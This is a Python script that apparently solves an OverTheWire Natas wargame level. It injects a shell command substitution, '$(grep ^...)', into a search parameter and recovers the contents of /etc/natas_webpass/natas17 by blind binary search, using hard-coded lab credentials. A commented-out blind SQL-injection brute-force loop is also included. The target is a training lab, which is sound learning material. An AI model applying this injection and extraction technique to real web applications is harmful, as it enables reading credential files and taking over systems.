#!/bin/python3
# python3
# "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
import urllib.request
import urllib.parse
import sys
import string

char = string.digits+string.ascii_uppercase+string.ascii_lowercase
MAX = len(char)
password_len = 32

# create a password manager
password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

# Add the username and password.
# If we knew the realm, we could use it instead of None.
top_level_url = 'http://natas16.natas.labs.overthewire.org'
password_mgr.add_password(None, top_level_url, username, password)

handler = urllib.request.HTTPBasicAuthHandler(password_mgr)

# create "opener" (OpenerDirector instance)
opener = urllib.request.build_opener(handler)

# Install the opener.
# Now all calls to urllib.request.urlopen use our opener.
urllib.request.install_opener(opener)

user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
headers = { 'User-Agent' : user_agent }
urlstart = top_level_url + '/index.php?needle=%24%28grep+%5E' 
urlend = '+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'
matchStr = "African"

def isMatch(url):
	#data = urllib.parse.urlencode(values)
	#binary_data = data.encode('ascii')
	req = urllib.request.Request(url)
	response = urllib.request.urlopen(req)
	the_page = response.read()
	return (matchStr in str(the_page))


def binarySearch(start, end, current):
	if start == (end - 1):
		return char[start]

	mid = (start + end) // 2
	testStr = char[start:mid]
	url= urlstart + current + '%5B' + testStr + '%5D' + urlend

	if not(isMatch(url)):
		return binarySearch(start, mid, current)
	return binarySearch(mid, end, current)		
	
		
def main():
	searchStr = ""
	for pos in range(password_len):
		searchStr += binarySearch(0, MAX, searchStr)
		print (searchStr)
	print ("done")

main()


'''
searchStr = ''
for pos in range(password_len):
	for c in char:
		values = {'username' : qstring + searchStr + c}
		#'natas16\" AND password COLLATE latin1_general_cs REGEXP \"^[A-Z]'}

		data = urllib.parse.urlencode(values)
		binary_data = data.encode('ascii')
		req = urllib.request.Request(url, binary_data, headers)
		response = urllib.request.urlopen(req)
		the_page = response.read()
		if matchStr in str(the_page):
			searchStr += c
			print(searchStr)
			continue

print(searchStr)
'''
	
